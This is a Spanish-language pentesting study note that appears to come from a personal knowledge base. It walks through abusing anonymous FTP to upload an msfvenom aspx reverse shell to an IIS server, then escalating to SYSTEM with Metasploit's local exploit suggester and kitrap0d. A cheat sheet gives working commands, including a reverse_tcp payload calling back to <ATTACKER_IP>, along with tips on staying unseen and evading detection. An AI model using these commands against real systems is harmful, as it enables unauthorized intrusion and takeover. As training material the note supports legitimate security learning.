---
tags:
  - metasploit/msfvenom
  - webshell
  - privex
---
## Conceptos Clave (TL;DR)

* MSFVenom combina MSFPayload y MSFEncode para facilitar la creacion de payloads personalizados y la eliminacion de bad characters.

* La evasion de antivirus moderna es compleja, ya que el analisis basado unicamente en firmas ha sido superado por analisis heuristico, inspeccion profunda de paquetes y machine learning.

* Un servicio FTP mal configurado con acceso anonimo y vinculado a un directorio web expuesto permite la carga (upload) de web shells para obtener ejecucion remota de codigo.

* El modulo Local Exploit Suggester de Metasploit permite escanear un sistema objetivo comprometido en busca de vectores de escalacion de privilegios locales para usuarios con accesos limitados.

  
## Herramientas Clave

* **msfvenom**: Utilizado para generar payloads y reverse shells en multiples formatos (ej. .aspx, .php, .exe) para evadir restricciones de ejecucion y configuraciones del objetivo.

* **ftp**: Cliente nativo para interactuar con servicios FTP mal configurados, inspeccionar archivos y subir cargas utiles a servidores remotos.

* **msfconsole (multi/handler)**: Listener universal en [Metasploit](../../📂%2008%20Herramientas&Cheatsheets/Metasploit.md) utilizado para recibir e interceptar conexiones tcp de los payloads detonados.

* **local_exploit_suggester**: Modulo de post-explotacion de Metasploit diseñado para enumerar vulnerabilidades del sistema y sugerir exploits funcionales.

  

## Metodología Paso a Paso

### Fase 1: Reconocimiento y Descubrimiento

El objetivo inicial es identificar los servicios expuestos que podamos aprovechar. Mediante escaneo de puertos, buscamos servicios FTP sin autenticacion fuerte y servidores web corriendo en la misma maquina. Iniciar sesion en el FTP empleando "anonymous" nos permite explorar el sistema de archivos del servidor. Si encontramos un directorio compartido con la raiz del servidor web (como evidenciado por la existencia de la carpeta "aspnet_client"), confirmamos que podemos subir archivos y ejecutarlos como .aspx.

  

### Fase 2: Preparacion y Carga del Payload

Identificada la tecnologia (Windows/IIS), se requiere fabricar una carga util que el objetivo logre procesar. Utilizamos msfvenom para generar el reverse shell en formato aspx asignando nuestra IP y puerto. Luego, utilizamos el comando put dentro de nuestra sesion de FTP activa para transferir el archivo malicioso al servidor remoto.

  

### Fase 3: Ejecucion y Captura de la Sesion

Antes de detonar el payload, preparamos msfconsole con el modulo multi/handler para estar a la escucha de la conexion entrante. Una vez configurado el listener, la ejecucion se logra realizando una simple peticion web hacia la ubicacion del archivo subido en el servidor remoto.

  

### Fase 4: Escalacion de Privilegios Local

Tras obtener la sesion inicial, es comun poseer un usuario de bajos privilegios (por ejemplo, IIS APPPOOL\Web). Revisando la arquitectura del sistema con comandos de enumeracion basica confirmamos el entorno. En Metasploit, cargamos el modulo Local Exploit Suggester apuntando a nuestra sesion activa, obteniendo una lista de posibles vulnerabilidades (ej. ms10_015_kitrap0d). Elegimos uno de estos exploits, configuramos el listener secundario y lo lanzamos para escalar a privilegios de sistema.

  
## Cheat Sheet de Comandos
```bash
# Escaneo de puertos exhaustivo con identificacion de versiones y servicios corriendo en todos los puertos

nmap -sV -T4 -p- <TARGET_IP>
```

```bash
# Generar payload reverse shell .aspx en crudo, definiendo LHOST (atacante) y LPORT (puerto de escucha)

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<LPORT_SHELL> -f aspx > <PAYLOAD_NAME>.aspx
```

```bash
# Iniciar conexion por FTP al objetivo (utilizar 'anonymous' como usuario si se solicita password dejar en blanco o presionar enter)

ftp <TARGET_IP>
```

```bash
# Comando dentro de la sesion FTP para subir el payload local al servidor remoto

put <PAYLOAD_NAME>.aspx
```

```bash
# Iniciar Metasploit de forma silenciosa e iniciar el handler para recibir la reverse shell

msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <LPORT_SHELL>
run
```

```bash
# Activar el payload haciendo una peticion al servidor web (puede hacerse desde navegador tambien)

curl http://<TARGET_IP>/<PAYLOAD_NAME>.aspx
```

```bash
# Ejecutar modulo Local Exploit Suggester apuntando a la sesion de meterpreter vulnerada

use post/multi/recon/local_exploit_suggester
set session <SESSION_ID>
run
```

```bash
# Configurar exploit local sugerido (ej. kitrap0d) para elevar privilegios, apuntando a una nueva escucha y sobre la sesion activa

use exploit/windows/local/ms10_015_kitrap0d
set LHOST <ATTACKER_IP>
set LPORT <LPORT_PRIVESC>
set SESSION <SESSION_ID>
run
```
  

## "Gotchas" y Troubleshooting

* **Indicadores de Entorno:** Identificar la carpeta `aspnet_client` por FTP es la pista critica para entender que los archivos subidos `.aspx` podran ser ejecutados en el servidor.

* **Evasion Visual en Web:** Para mantener un bajo perfil, es recomendable que el archivo `.aspx` subido carezca de cualquier etiqueta HTML. Al navegar a el, la victima no visualizara nada extraño en la pagina (se vera en blanco) mientras la ejecucion transcurre de fondo.

* **Inestabilidad de Meterpreter:** Si la sesion muere repetidamente luego de establecer conexion, el texto sugiere codificar el payload al momento de generarlo para eludir errores en la ejecucion o detecciones de seguridad.

* **Falsos Positivos de PrivEsc:** Los resultados del modulo Local Exploit Suggester no son absolutos. Algunos exploits como `bypassuac_eventvwr` mostraran el objetivo como vulnerable, pero fallaran si el usuario no pertenece ya al grupo de administradores. La tactica correcta es probar la siguiente sugerencia hasta encontrar una efectiva.